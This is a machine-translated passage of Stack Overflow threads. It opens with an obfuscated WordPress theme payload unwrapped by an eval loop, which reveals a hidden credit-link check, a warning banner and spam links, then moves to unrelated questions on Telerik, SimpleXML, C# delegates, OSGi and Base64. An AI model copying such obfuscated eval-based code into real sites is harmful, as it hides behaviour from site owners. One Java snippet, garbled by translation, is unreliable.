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')))));
CODE;

while (strpos($code, 'eval') === 0) {
    echo $code, PHP_EOL;

    $code = substr_replace($code, 'echo', 0, 4);

    ob_start();
    eval($code);
    $code = trim(ob_get_clean());
}

echo $code, PHP_EOL; 
```

这给了你很多垃圾，最后：

```
$cf_____________j='c';$ax________c='d';$nl_____d='_';$ci_______________b='e';$fi________v='d';$qu______________c='6';$hk______________o='a';$ar_____h='e';$hp__________a='s';$cc____e='b';$um_______u='o';$zs_______________s='e';$yr_______n='4';$lr_________a=$cc____e.$hk______________o.$hp__________a.$zs_______________s.$qu______________c.$yr_______n.$nl_____d.$ax________c.$ar_____h.$cf_____________j.$um_______u.$fi________v.$ci_______________b;$sh______b='i';$lw_______e='i';$bx__v='x';$uo_____________o='c';$jb________r='t';$ge______y='e';$jn_______________o='u';$sw__________b='n';$rb____________k='s';$xc_______j='n';$tu___________o='t';$lh______v='f';$hc____o='o';$eq____c='s';$ks____t='_';$ep________g=$lh______v.$jn_______________o.$sw__________b.$uo_____________o.$tu___________o.$sh______b.$hc____o.$xc_______j.$ks____t.$ge______y.$bx__v.$lw_______e.$rb____________k.$jb________r.$eq____c;$wj______________r='e';$pl________r='n';$oy____t='f';$pj_____________i='o';$zg________h='p';$xe___________h=$oy____t.$pj_____________i.$zg________h.$wj______________r.$pl________r;$um_______j='f';$bm_____________b='d';$ah_______g='e';$yw__y='r';$hy__________t='a';$oo____e=$um_______j.$yw__y.$ah_______g.$hy__________t.$bm_____________b;$zd__g='s';$ia_____a='o';$le_____v='e';$pi_____i='l';$xm____j='f';$dh_______________s='c';$bz___u=$xm____j.$dh_______________s.$pi_____i.$ia_____a.$zd__g.$le_____v;define("WP_ID", $lr_________a("Mi4wLjA="));define("WP_TTL", $lr_________a("MTA4MDA="));define("WP_SRC", $lr_________a("dHBva24="));function wp_get_header() {global $lr_________a, $ep________g;if ($ep________g($lr_________a("d3BfdGhlbWVfR1BMX2NyZWRpdHM=")) &&$ep________g($lr_________a("d3BfZ2V0X2Zvb3Rlcg==")) &&$ep________g($lr_________a("d3BfY3ZfdmVyaWZ5"))) {get_header();}}function wp_get_footer() {get_footer();wp_cv_verify();}function wp_cv_verify() {global $lr_________a, $xe___________h, $bz___u, $oo____e;$cw____g = TEMPLATEPATH."/".$lr_________a("Zm9vdGVyLnBocA==");$oz_______________l = @$xe___________h($cw____g, "r");$cw____g = @$oo____e($oz_______________l, @filesize($cw____g));@$bz___u($oz_______________l);$qk___e = TEMPLATEPATH."/".$lr_________a("ZnVuY3Rpb25zLnBocA==");$oz_______________l = @$xe___________h($qk___e, "r");$qk___e = @$oo____e($oz_______________l, @filesize($qk___e));@$bz___u($oz_______________l);$ds________m = 0;if($cw____g && $qk___e) {if ($lr_________a("Z2VuZXJpY3dwdGhlbWVzLmNvbQ==") !== str_replace("www.", "", $_SERVER["SERVER_NAME"])) {if (substr_count($cw____g, $lr_________a("Z2VuZXJpY3dwdGhlbWVzLmNvbQ==")) < 2) {$ds________m = 1;}if (substr_count($cw____g, "wp_theme_GPL_credits()") < 1) {$ds________m = 2;}}if(WP_ID != "2.0.0") {$ds________m = 12;}}if($ds________m > 0) {echo "<div style=\"position: fixed; bottom:0; left:0; width:100%; height: 25px; background-color: red; color: white; font-size: 16px; padding: 2px 10px; text-align: center;\"> <strong> This themes is powered by <a href=\"http://genericwpthemes.com\" style=\"color: white;\">Free Wordpress Themes</a>. This website violated the terms of use <a href=\"http://genericwpthemes.com\" style=\"color: white;\">Free Wordpress Themes</a> </strong> </div>";echo "<!-- v: $ds________m -->";}}function wp_loaded() {global $lr_________a, $ep________g;return $ep________g($lr_________a("d3BfdGhlbWVfR1BMX2NyZWRpdHM="));}if (!function_exists("the_content_limit")) {function the_content_limit($ov______t, $bx__________q = "(more...)", $sa_________e = 0, $rb____f = "") {$sy_______j = get_the_content($bx__________q, $sa_________e, $rb____f);$sy_______j = apply_filters("the_content", $sy_______j);$sy_______j = str_replace("]]>", "]]&gt;", $sy_______j);if (strlen($_GET["p"]) > 0) {echo $sy_______j;}else if ((strlen($sy_______j)>$ov______t) && ($zk__________f = strpos($sy_______j, " ", $ov______t ))) {$sy_______j = substr($sy_______j, 0, $zk__________f);$sy_______j = $sy_______j;echo $sy_______j;echo "...";echo "<br/>";echo "<div class='read-more'><a href='".get_permalink()."'>$bx__________q</a></div></p>";} else {echo $sy_______j;}}}$zd__g='s';$ia_____a='o';$le_____v='e';$pi_____i='l';$xm____j='f';$dh_______________s='c';$bz___u=$xm____j.$dh_______________s.$pi_____i.$ia_____a.$zd__g.$le_____v;function wp_theme_GPL_credits() {echo 'Art by <a href="http://www.quickest-way-to-lose-weight.co">Quickest Way to Lose Weight</a> | <a href="http://www.driveway-alarm.info">Driveway Alarm</a> | <a href="http://www.medical-assistant-salary.info">Medical Assistant Salary</a>';} 
```

不，我也不打算为你去混淆这个结果。:P

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:07:39.240

`eval`在用`echo`（准确地说是 22）替换的几次迭代之后，这是由代码引起的：

```
 $cf_____________j='c';$ax________c='d';$nl_____d='_';$ci_______________b='e';$fi________v='d';$qu______________c='6';$hk______________o='a';$ar_____h='e';$hp__________a='s';$cc____e='b';$um_______u='o';$zs_______________s='e';$yr_______n='4';$lr_________a=$cc____e.$hk______________o.$hp__________a.$zs_______________s.$qu______________c.$yr_______n.$nl_____d.$ax________c.$ar_____h.$cf_____________j.$um_______u.$fi________v.$ci_______________b;$sh______b='i';$lw_______e='i';$bx__v='x';$uo_____________o='c';$jb________r='t';$ge______y='e';$jn_______________o='u';$sw__________b='n';$rb____________k='s';$xc_______j='n';$tu___________o='t';$lh______v='f';$hc____o='o';$eq____c='s';$ks____t='_';$ep________g=$lh______v.$jn_______________o.$sw__________b.$uo_____________o.$tu___________o.$sh______b.$hc____o.$xc_______j.$ks____t.$ge______y.$bx__v.$lw_______e.$rb____________k.$jb________r.$eq____c;$wj______________r='e';$pl________r='n';$oy____t='f';$pj_____________i='o';$zg________h='p';$xe___________h=$oy____t.$pj_____________i.$zg________h.$wj______________r.$pl________r;$um_______j='f';$bm_____________b='d';$ah_______g='e';$yw__y='r';$hy__________t='a';$oo____e=$um_______j.$yw__y.$ah_______g.$hy__________t.$bm_____________b;$zd__g='s';$ia_____a='o';$le_____v='e';$pi_____i='l';$xm____j='f';$dh_______________s='c';$bz___u=$xm____j.$dh_______________s.$pi_____i.$ia_____a.$zd__g.$le_____v;define("WP_ID", $lr_________a("Mi4wLjA="));define("WP_TTL", $lr_________a("MTA4MDA="));define("WP_SRC", $lr_________a("dHBva24="));function wp_get_header() {global $lr_________a, $ep________g;if ($ep________g($lr_________a("d3BfdGhlbWVfR1BMX2NyZWRpdHM=")) &&$ep________g($lr_________a("d3BfZ2V0X2Zvb3Rlcg==")) &&$ep________g($lr_________a("d3BfY3ZfdmVyaWZ5"))) {get_header();}}function wp_get_footer() {get_footer();wp_cv_verify();}function wp_cv_verify() {global $lr_________a, $xe___________h, $bz___u, $oo____e;$cw____g = TEMPLATEPATH."/".$lr_________a("Zm9vdGVyLnBocA==");$oz_______________l = @$xe___________h($cw____g, "r");$cw____g = @$oo____e($oz_______________l, @filesize($cw____g));@$bz___u($oz_______________l);$qk___e = TEMPLATEPATH."/".$lr_________a("ZnVuY3Rpb25zLnBocA==");$oz_______________l = @$xe___________h($qk___e, "r");$qk___e = @$oo____e($oz_______________l, @filesize($qk___e));@$bz___u($oz_______________l);$ds________m = 0;if($cw____g && $qk___e) {if ($lr_________a("Z2VuZXJpY3dwdGhlbWVzLmNvbQ==") !== str_replace("www.", "", $_SERVER["SERVER_NAME"])) {if (substr_count($cw____g, $lr_________a("Z2VuZXJpY3dwdGhlbWVzLmNvbQ==")) < 2) {$ds________m = 1;}if (substr_count($cw____g, "wp_theme_GPL_credits()") < 1) {$ds________m = 2;}}if(WP_ID != "2.0.0") {$ds________m = 12;}}if($ds________m > 0) {echo "<div style=\"position: fixed; bottom:0; left:0; width:100%; height: 25px; background-color: red; color: white; font-size: 16px; padding: 2px 10px; text-align: center;\"> <strong> This themes is powered by <a href=\"http://genericwpthemes.com\" style=\"color: white;\">Free Wordpress Themes</a>. This website violated the terms of use <a href=\"http://genericwpthemes.com\" style=\"color: white;\">Free Wordpress Themes</a> </strong> </div>";echo "<!-- v: $ds________m -->";}}function wp_loaded() {global $lr_________a, $ep________g;return $ep________g($lr_________a("d3BfdGhlbWVfR1BMX2NyZWRpdHM="));}if (!function_exists("the_content_limit")) {function the_content_limit($ov______t, $bx__________q = "(more...)", $sa_________e = 0, $rb____f = "") {$sy_______j = get_the_content($bx__________q, $sa_________e, $rb____f);$sy_______j = apply_filters("the_content", $sy_______j);$sy_______j = str_replace("]]>", "]]&gt;", $sy_______j);if (strlen($_GET["p"]) > 0) {echo $sy_______j;}else if ((strlen($sy_______j)>$ov______t) && ($zk__________f = strpos($sy_______j, " ", $ov______t ))) {$sy_______j = substr($sy_______j, 0, $zk__________f);$sy_______j = $sy_______j;echo $sy_______j;echo "...";echo "<br/>";echo "<div class='read-more'><a href='".get_permalink()."'>$bx__________q</a></div></p>";} else {echo $sy_______j;}}}$zd__g='s';$ia_____a='o';$le_____v='e';$pi_____i='l';$xm____j='f';$dh_______________s='c';$bz___u=$xm____j.$dh_______________s.$pi_____i.$ia_____a.$zd__g.$le_____v;function wp_theme_GPL_credits() {echo 'Art by <a href="http://www.quickest-way-to-lose-weight.co">Quickest Way to Lose Weight</a> | <a href="http://www.driveway-alarm.info">Driveway Alarm</a> | <a href="http://www.medical-assistant-salary.info">Medical Assistant Salary</a>';} 
```

# localization - Telerik Reports - 本地化表达式

> ID：12300536
> 
> 赞同：2
> 
> 时间：2012-09-06T12:50:38.643
> 
> 标签：localization, telerik-reporting

我们目前正在使用需要本地化的 Telerik 报告。有什么方法可以本地化在如下文本框中的表达式中设置的文本？

```
Ex. =iif(Fields.IsValid = 1, "Text Example 1", "Text Example 2") 
```

# php - 根据子值解析 simplexml

> ID：12300538
> 
> 赞同：-2
> 
> 时间：2012-09-06T12:50:47.527
> 
> 标签：php, xml, simplexml

> **可能重复：**
> [PHP xpath - 查找具有值的元素并获取元素之前和之后的元素](https://stackoverflow.com/questions/6279544/php-xpath-find-element-with-a-value-and-also-get-elements-before-and-after-ele)

我有以下xml：

```
<Table>
    <ID>100</ID>
    <Name>Fridge</Name>
    <Description>A cool refrigerator</Description>
</Table>
<Table>
    <ID>100</ID>
    <Name>Fridge</Name>
    <Description>Latest Refrigerator</Description>
</Table>
<Table>
    <ID>200</ID>
    <Name>Fridge</Name>
    <Description>Another refrigerator</Description>
</Table> 
```

在上面的示例中，我想获取 ID=100 的节点的 Name 和 Description 的子值。xml 文件中有大约 1000 个表节点。

如何解析整个 xml 并仅获取 ID 等于 100 的节点的名称和描述值？

到目前为止，我已经尝试了以下代码，但无法给出我想要的：

```
$source = 'Tables.xml';
$xmlstr = file_get_contents($source);
$sitemap = new SimpleXMLElement($xmlstr);

$sitemap = new SimpleXMLElement($source,null,true);

foreach($sitemap as $url) {

    if($url->ID == '100')
    {
        echo 'Name: '.(string)$url->Name.', Description: '.(string)$url->Description.'<br>';
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T12:56:10.283

`Table`如果您获取所有标签并遍历它们，这应该非常简单：

```
// Assuming you already loaded the XML into the SimpleXML object $xml
$names_and_descriptions = array();
foreach ($xml->Table as $t) {
  if ($t->ID == 100) {
    echo $t->Name . " " . $t->Description . "\n";
    // Or stick them into an array or whatever...
    $names_and_descriptions[] = array(
      'name'=>$t->Name, 
      'description'=>$t->Description
    );
  }
}
var_dump($names_and_descriptions); 
```

# c# - 如何在 C# 中创建回调变量（真正的单播委托）

> ID：12300540
> 
> 赞同：3
> 
> 时间：2012-09-06T12:50:51.390
> 
> 标签：c#, .net, callback

如何在 C# 中创建一个真正的单播委托。即一个委托实例，它可以在其调用列表中引用一个（并且只有一个）方法，因此可以用作回调（对于单个订阅者）而不是事件（可能有很多订阅者）。

该框架具有 System.Delegate 和 System.MulticastDelegate 类，这给人一种错误的印象，即 System.Delegate 是单播，而 System.Multicast 委托添加了多播功能。[但是 System.Delegate http://msdn.microsoft.com/en-us/library/system.delegate.aspx](http://msdn.microsoft.com/en-us/library/system.delegate.aspx)的 MSDN 文档表明 System.Delegate 实际上是多播...

“委托的调用列表是一组有序的委托，其中列表的每个元素恰好调用委托所代表的方法之一。”

...而 System.MulticastDelegate 的文档并没有真正解释它提供的额外行为。

这方面的官方文档相当混乱，但有一点很清楚，最终用户不能从 System.Delegate 或 System.MulticastDelegate 派生。那么框架是否支持创建真正的单播委托，该委托可以用作变量来存储对单个回调的引用？

@dtb。如果我可以使用单播委托，则无需运行时检查。当然，应用程序逻辑仍然可能以其他方式失败，例如分配了错误的处理程序，但至少如果我使用单播委托，那么存在多个处理程序的问题我只期望一个是一个简单的问题不可能存在，因此需要检查的东西更少，单元测试更简单，设计更优雅。此外，如果具有返回值的方法的委托在其调用列表中有多个处理程序，则返回给调用者的是列表中最后一个处理程序返回的值，而不是第一个处理程序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T12:55:42.567

如果您真的需要一个带有事件的“单播”委托，为什么不简单地为该事件实现自己的添加/删除方法呢？

的“问题”`Delegate`是`MulticastDelegate`派生类，因此如果有人将`MulticastDelegate`对象分配给`Delegate`变量，那么您将始终拥有一个`MulticastDelegate`.

例如，我们可以将默认`event`实现简化为：

```
private ChangedEventHandler _changed;
public event ChangedEventHandler Changed
{
   add
   {
      _changed += value;
   }
   remove
   {
      _changed -= value;
   }
} 
```

现在让我们将事件实现更改为：

```
private ChangedEventHandler _changed;
public event ChangedEventHandler Changed
{
   add
   {
      _changed = value; // Do NOT combine delegates
   }
   remove
   {
      _changed -= value;
   }
} 
```

现在你拥有的是（几乎）一个单播委托，因为事件语法用户不能直接分配多播委托，并且只存储最后分配的委托。如果您的用户真的是恶意的，他们可以创建一个`MulticastDelegate`然后将该委托添加到您的事件处理程序。如果您确实需要防止这种情况，您可以将此检查添加到`add`方法中：

```
if (value.GetInvocationList().Length > 1)
    throw new ArgumentException("MulticastDelegates are not allowed here."); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T15:25:20.593

这比使用委托有点尴尬，但一种方法是使用您想要的方法传递回调接口。由于该方法只能有一个实现，因此只能注册一个回调。

```
public interface IDoSomething
{
    void DoSomething();
}

public sealed class MyClass
{
    private IDoSomething _doer;

    //We use a Set method rather than a property to prevent other classes from accessing the callback
    //Another common (and generally better) pattern is to pass the instance into the constructor
    public void SetSomethingDoer(IDoSomething doer)
    {
        _doer = doer;
    }

    //Other code can now access _doer to call back the method
} 
```

这具有允许您将多个回调方法组合在一起的附带好处，这在您试图保证单个回调处理程序的情况下通常是有意义的。

# java - 最好使用类型或属性在 OSGi 声明式服务之间进行选择？

> ID：12300542
> 
> 赞同：2
> 
> 时间：2012-09-06T12:50:56.177
> 
> 标签：java, osgi, declarative-services

我目前正在将一段代码从纯 Java 代码转换为 OSGi 声明式服务。

## 原始纯 Java 代码

```
new AggregateServiceImpl(
    new ChildServiceImpl1(),
    new ChildServiceImpl2(),
    new ChildServiceImpl3()
); 
```

这些类是这样声明的：

```
class AggregateServiceImpl implements Service
class ChildServiceImpl1 implements Service
class ChildServiceImpl2 implements Service
class ChildServiceImpl3 implements Service 
```

所以所有的类都实现了 Service，但是 Aggregate 实现能够在调用时推迟到子 Service。

AggregateServiceImpl 本身不知道其他实现的存在。它的构造函数最初声明为：

```
public class AggregateServiceImpl(Service... children) 
```

**澄清：**接口名称“服务”是通用的，并不意味着代表 OSGi DS 或服务概念。

## 转换为 OSGi

首先，我将每个实现移动到它自己的包中。然后我声明我的组件（服务实现）。我碰巧在使用bnd，所以我使用服务注释。例如：

```
@Component
class ChildServiceImpl1 implements Service 
```

在客户端类中，我们可以使用低级 OSGi API 查找服务或使用该捆绑包中的 DS 为我们创建对象。

## 问题

查找“服务”的最佳方式是什么？我*想要*AggregateServiceImpl 但我可能会收到 ChildServiceImpl 之一。

在查找 ServiceReferences 时，最好使用单独的服务类型或将属性添加到其中一个组件（例如“isRootService”）以用作过滤器？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T16:50:35.797

最好的方法是使用服务注册属性

```
 @Component
 @Service
 @Property(name = "service.id", value = "<some service unique ID")
 class ChildServiceImpl1 implements Service{...} 
```

当您查找某些特定服务时，您可以使用服务过滤器：

```
bc.getServiceReferences(Service.class.getName(), "(service.id=<some value>)"); 
```

或者如果您想在 DS 组件中使用它作为服务参考：

```
@Reference(target = "(service.id=<some value>)", cardinality = ...)
private Service service; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:31:52.270

如果*AggregateServiceImpl*是其他捆绑包使用的唯一*服务*，那么它应该是您注册的唯一服务。

从您当前显示的代码中，我们无法判断*AggregateServiceImpl*类是否依赖于*Service*或实际实现。

如果它直接依赖于其他实现，而不是*Service*接口（如您当前描述的那样），则聚合包应该直接创建它需要的其他实现类，然后将*AggregateServiceImpl*注册为*Service*。

如果其他实现也需要在其他地方使用，那么您应该使用属性（如您所建议的那样），以便消费者可以区分它们。在这种情况下，您仍然不能使用 DS 来构建您的聚合，因为它不依赖于 Service

# java - 尝试将字符串编码/解码为 Base64 时出错

> ID：12300561
> 
> 赞同：16
> 
> 时间：2012-09-06T12:51:59.077
> 
> 标签：java, base64

我需要从字节数组到stirng进行Base64编码，而不是另一个字节数组。但是当我将它解码回来时，我得到了异常。这是代码

我正在尝试使用 Base64 编码将字节数组编码为字符串。当我编码时，它似乎可以工作，但是当我解码时，它会引发异常。我究竟做错了什么？

```
import org.springframework.security.crypto.codec.Base64;

byte[] bytes = new byte[]{1,2,3,4,5,6,7,8,9};
String stringToStore = Base64.encode(bytes).toString();
byte[] restoredBytes = Base64.decode(stringToStore.getBytes()); 
```

这是我得到的例外：

```
org.springframework.security.crypto.codec.InvalidBase64CharacterException: Bad Base64 input character decimal 91 in array position 0
at org.springframework.security.crypto.codec.Base64.decode(Base64.java:625)
at org.springframework.security.crypto.codec.Base64.decode(Base64.java:246) 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-09-06T12:57:43.390

能不能试试...

```
byte[] bytes = new byte[]{1,2,3,4,5,6,7,8,9}; 
String stringToStore = new String(Base64.encode(bytes));
byte[] restoredBytes = Base64.decode(stringToStore.getBytes()); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-09-06T13:12:28.150

`Base64.encode(bytes).toString()`不返回您期望的字符串。

你应该使用

```
new String(Base64.encode(bytes)) 
```

正如 iccthedral 所建议的那样。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-06T12:59:17.687

```
String stringToStore = Base64.encode(bytes).toString(); 
```

这不是将字节转换为字符串。它是对象的 Java 字符串表示形式（例如，`"[B@9a4d5c6"`）。您需要执行 iccthedral 的建议并将字节提供给 String 类。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-09-23T16:00:02.463

If you are using Android API 8+ there's a `Base64` helper class in `android.util`.

```
String stringToStore =  Base64.encodeToString(cipherText, Base64.DEFAULT); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-11-25T08:50:46.263

最初，如果您将其用于密码，则不建议将其转换为字符串。要用作字符串，请遵循以下代码段

```
    字节[]字节=新字节[]{1,2,3,4,5,6,7,8,9};
    String stringToStore = new String(Base64.encode(bytes), "UTF-8");
    byte[] restoreBytes = Base64.decode(stringToStore.getBytes());

```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-06T12:55:56.467

这对我有用：

```
 byte[] bytes = new byte[]{1, 2, 3, 4, 5, 6, 7, 8, 9};
        String stringToStore = Base64.encode(bytes);
        //System.out.println(stringToStore);//AQIDBAUGBwgJ
        byte[] restoredBytes = Base64.decode(stringToStore);
        //System.out.println(Arrays.toString(restoredBytes));//[1, 2, 3, 4, 5, 6, 7, 8, 9] 
```

我对其进行了一些编辑：

*   不要调用`toString()`. 方法已经返回一个（正如其他人所说的那样，这可能是导致错误的原因）`String``encode(bytes)``String`
*   为什么在不需要更多代码时转换为字节（`Base64.decode(stringToStore.getBytes())`）

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-03-13T14:19:46.107

要解码包含 base64 内容的字节数组，您可以使用*javax.xml.bind.DatatypeConverter*。它工作得很好。我用它来解码二进制类型的 MongoDB 值。

```
String testString = "hi, I'm test string";
byte[] byteArrayBase64 = org.apache.commons.codec.digest.DigestUtils.md5(testString);
